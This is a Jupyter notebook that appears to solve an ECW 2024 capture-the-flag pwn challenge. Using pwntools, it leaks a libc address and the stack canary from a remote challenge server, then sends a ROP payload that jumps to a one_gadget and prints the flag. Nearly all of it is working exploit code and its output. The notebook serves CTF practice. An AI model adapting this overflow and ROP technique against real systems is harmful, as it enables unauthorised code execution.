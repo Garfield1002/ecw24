{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "from pwn import p64, u64\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to challenges.challenge-ecw.eu on port 39143\n",
      "[x] Opening connection to challenges.challenge-ecw.eu on port 39143: Trying 141.94.137.179\n",
      "[+] Opening connection to challenges.challenge-ecw.eu on port 39143: Done\n"
     ]
    }
   ],
   "source": [
    "# TARGET = process(\"./vuln_patched\")\n",
    "# change the command\n",
    "\n",
    "TARGET = remote(\"challenges.challenge-ecw.eu\", \"39143\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "PROMPT = b\"plz gief inpt\\n\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Leak address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def leak_addr(offset):\n",
    "    sz = 240 - offset\n",
    "    TARGET.recvuntil(PROMPT, timeout=1)\n",
    "    TARGET.sendline(b\"i\")\n",
    "\n",
    "    TARGET.recvuntil(PROMPT, timeout=1)\n",
    "    TARGET.sendline(b\"A\" * sz)\n",
    "\n",
    "    TARGET.recvuntil(PROMPT, timeout=1)\n",
    "    TARGET.sendline(b\"g\")\n",
    "\n",
    "    TARGET.recvuntil(PROMPT, timeout=1)\n",
    "    TARGET.sendline(b\"l\")\n",
    "\n",
    "    TARGET.recvuntil(PROMPT, timeout=1)\n",
    "    TARGET.sendline(b\"o\")\n",
    "\n",
    "    l = TARGET.recvuntil(PROMPT, timeout=1)\n",
    "\n",
    "    l = l[sz + 1 : -len(PROMPT)]\n",
    "    return l"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x71a5b6a1a3e3\n"
     ]
    }
   ],
   "source": [
    "libc_ = bytes(leak_addr(121)).ljust(8, b\"\\x00\")\n",
    "print(hex(u64(libc_)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x17822176ff334300\n"
     ]
    }
   ],
   "source": [
    "canary = b\"\\x00\" + bytes(leak_addr(8))\n",
    "print(hex(u64(canary)))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "source": [
    "## ROP chain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/home/jack/dev/ctf/ecw24/pwn/Question_of_Defineition/libc.so.6'\n",
      "    Arch:       amd64-64-little\n",
      "    RELRO:      Partial RELRO\n",
      "    Stack:      Canary found\n",
      "    NX:         NX enabled\n",
      "    PIE:        PIE enabled\n",
      "[*] Loaded 196 cached gadgets for './libc.so.6'\n"
     ]
    }
   ],
   "source": [
    "libc = ELF(\"./libc.so.6\")\n",
    "rop = ROP(libc)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x822e0'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(libc.symbols[\"_IO_file_overflow\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Gadget(0x102037, ['pop rcx', 'ret'], ['rcx'], 0x8)"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rop.rcx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Gadget(0x319ad, ['pop rbx', 'ret'], ['rbx'], 0x8)"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rop.rbx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mk_payload(canary, libc_base):\n",
    "    ONE_GADGET = 0x4C140 + libc_base\n",
    "\n",
    "    POP_RCX = 0x102037 + libc_base\n",
    "    POP_RBX = 0x319AD  + libc_base\n",
    "\n",
    "    return (\n",
    "        b\"A\" * 248  # padding until the canary\n",
    "        + canary\n",
    "        + b\"A\" * 0x28  # padding until the return address\n",
    "        + p64(POP_RCX)\n",
    "        + p64(0)  # value of rax\n",
    "        + p64(POP_RBX)\n",
    "        + p64(0)  # value of rbx\n",
    "        + p64(ONE_GADGET)\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "libc_base = u64(libc_) - (libc.symbols[\"_IO_file_overflow\"] + 259)\n",
    "rop = mk_payload(canary, libc_base)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Receiving all data\n",
      "[x] Receiving all data: 0B\n",
      "[x] Receiving all data: 28B\n",
      "[x] Receiving all data: 78B\n",
      "[+] Receiving all data: Done (78B)\n",
      "[*] Closed connection to challenges.challenge-ecw.eu port 39143\n",
      "plz gief inpt\n",
      "plz gief inpt\n",
      "ECW{c-define-considered-harmful-f97f6c791eb8de51}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "TARGET.sendline(b\"i\")\n",
    "TARGET.sendline(rop)\n",
    "\n",
    "TARGET.sendline(b\"f\")\n",
    "TARGET.sendline(b\"q\")\n",
    "\n",
    "# Give the ROP chain time to process\n",
    "time.sleep(2)\n",
    "\n",
    "TARGET.sendline(b\"get_flag\")\n",
    "print(TARGET.recvall(timeout=1).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
